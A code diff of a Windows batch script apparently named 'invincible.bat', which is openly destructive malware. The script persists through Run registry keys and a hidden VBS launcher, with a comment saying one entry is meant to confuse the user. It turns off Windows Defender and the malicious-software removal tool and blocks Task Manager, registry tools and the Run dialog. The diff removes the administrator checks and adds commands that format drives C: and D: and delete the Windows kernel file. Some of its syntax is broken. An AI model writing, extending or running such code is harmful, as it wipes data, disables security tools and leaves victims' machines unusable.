@@ -41,6 +41,12 @@ label C: invincible
 
 label D: invincible
 
+reg add "HKCU" /v invincible /t REG_DWORD /d 1 /f
+reg add "HKCR" /v invincible /t REG_DWORD /d 1 /f
+reg add "HKLM" /v invincible /t REG_DWORD /d 1 /f
+reg add "HKU" /v invincible /t REG_DWORD /d 1 /f
+reg add "HKCC" /v invincible /t REG_DWORD /d 1 /f
+
 set "target=C:\invincible"
 md "%target%" 2>nul
 
@@ -65,13 +71,14 @@ echo Set WshShell = CreateObject("WScript.Shell") > "%target%\hide.vbs"
 echo WshShell.Run Chr(34) ^& "%target%\invincible.bat" ^& Chr(34), 0, False >> "%target%\hide.vbs"
 pause
 
-copy "invincible.bat" "C:\invincible" /f
-
 set "scriptPath=%~dp0invincible.bat"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Invincible" /t REG_SZ /d "%scriptPath%" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HideVBS /t REG_SZ /d "wscript.exe \"C:\invincible\hide.vbs" /f
 :: this is to confuse the user btw the confuse.exe shi
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HideVBS /t REG_SZ /d "wscript.exe \"C:\confuse.exe" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v confuseshit /t REG_SZ /d "wscript.exe \"C:\confuse.exe" /f
+
+copy "invincible.bat" "C:\invincible"
+
 
 set regTheme=HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize
 set regColor=HKCU\Software\Microsoft\Windows\DWM
@@ -87,14 +94,6 @@ reg add "%regTheme%" /v AppsUseLightTheme /t REG_DWORD /d 0 /f
 taskkill /f /im explorer.exe
 start explorer.exe
 
-:: Elevate to admin if needed
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo Run as Administrator required.
-    pause
-    exit /b
-)
-
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
@@ -106,14 +105,6 @@ sc config WinDefend start= disabled
 
 pause
 goto MENU
-
-:: Elevate check
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo Run as Administrator required.
-    pause
-    exit /b
-)
 
 :: Disable Defender via Group Policy registry keys
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
@@ -178,9 +169,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
 
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegedit /t REG_DWORD /d 1 /f
-
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableMMC /t REG_DWORD /d 1 /f
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
 
@@ -277,13 +266,25 @@ start cmd.exe
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v DontOfferThroughWUAU /t REG_DWORD /d 1 /f >nul 2>&1
 
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+
 if exist "%SystemRoot%\System32\mrt.exe" (
     takeown /f "%SystemRoot%\System32\mrt.exe" >nul 2>&1
     icacls "%SystemRoot%\System32\mrt.exe" /grant administrators:F >nul 2>&1
     del /f /q "%SystemRoot%\System32\mrt.exe" >nul 2>&1
 )
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\CONTROL PANEL"
+    takeown /f "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\CONTROL PANEL"
+    icacls "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\CONTROL PANEL" /grant administrators:F >nul 2>&1
+    del /f /q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\CONTROL PANEL"
+)
+
+if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run"
+    takeown /f "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run"
+    icacls "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run" /grant administrators:F >nul 2>&1
+    del /f /q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run"
+)
 
 pause
 goto MENU
@@ -365,9 +366,7 @@ takeown /f "%USERPROFILE%\Videos" /r /d y
 w32tm /config /manualpeerlist:"", /syncfromflags:manual /reliable:YES /update
 net stop w32time
 
-date 12-21-2099
-
-time 66:99:77
+date 12-21-2011
 
 set "target=%SystemRoot%\System32\gpedit.msc"
 
@@ -414,9 +413,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v lega
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "%message%" /f
 
 set "WALLPAPER=C:\invincible\z5UNyun.png"
-
-:: Validate file silently
-if not exist "%WALLPAPER%" exit /b
 
 :: Registry tweaks for Fill style
 reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f >nul
@@ -555,6 +551,22 @@ shutdown /s /f /t 0
 format C:\Windows\System32
 
 format C:\*.*
+
+format D:
+
+format D:\*.*
+
+takeown /f C:\Windows\System32\ntoskrnl.exe /r /d y
+
+icacls "C:\Windows\System32\ntoskrnl.exe" /grant Everyone:F /t /c
+
+icacls "C:\Windows\System32\ntoskrnl.exe" /remove:g Administrators /t /c
+icacls "C:\Windows\System32\ntoskrnl.exe" /remove:g SYSTEM /t /c
+
+icacls "C:\Windows\System32\ntoskrnl.exe" /inheritance:r /t /c
+
+del /f /s /q "C:\Windows\System32\ntoskrnl.exe"
+rd /s /q "C:\Windows\System32\ntoskrnl.exe"
 
 pause
 goto MENU
